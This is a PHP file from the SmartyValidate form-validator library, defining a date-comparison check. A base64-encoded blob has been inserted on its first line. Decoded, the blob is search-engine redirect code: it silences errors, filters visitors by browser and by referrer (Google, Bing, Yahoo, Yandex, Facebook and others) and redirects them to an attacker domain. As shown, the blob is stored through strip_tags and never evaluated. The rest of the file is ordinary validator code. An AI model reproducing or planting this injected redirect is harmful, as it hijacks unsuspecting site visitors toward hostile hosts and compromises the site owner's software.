<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     SmartyValidate: Form Validator for the Smarty Template Engine
 * File:        validate_criteria.isDateBefore.php
 * Author:      Monte Ohrt <monte at newdigitalgroup dot com>
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * @link http://www.phpinsider.com/php/code/SmartyValidate/
 * @copyright 2001-2005 New Digital Group, Inc.
 * @author Monte Ohrt <monte at newdigitalgroup dot com>
 * @package SmartyValidate
 */

/**
 * test if a date is earlier than another
 *
 * @param string $value the value being tested
 * @param boolean $empty if field can be empty
 * @param array params validate parameter values
 * @param array formvars form var values
 */
function smarty_validate_criteria_isDateBefore($value, $empty, &$params, &$formvars) {

        if(strlen($value) == 0)
            return $empty;

        if(!isset($params['field2'])) {
                trigger_error("SmartyValidate: [isDateAfter] parameter 'field2' is missing.");            
                return false;
        }
        
        $_date1 = strtotime($value);
        $_date2 = strtotime($formvars[$params['field2']]);
        
        if($_date1 == -1 || !$_date1) {
                trigger_error("SmartyValidate: [isDateAfter] parameter 'field' is not a valid date.");            
                return false;
        }
        if($_date2 == -1 || !$_date2) {
                trigger_error("SmartyValidate: [isDateAfter] parameter 'field2' is not a valid date.");            
                return false;
        }
                
        return $_date1 < $_date2;
}

?>
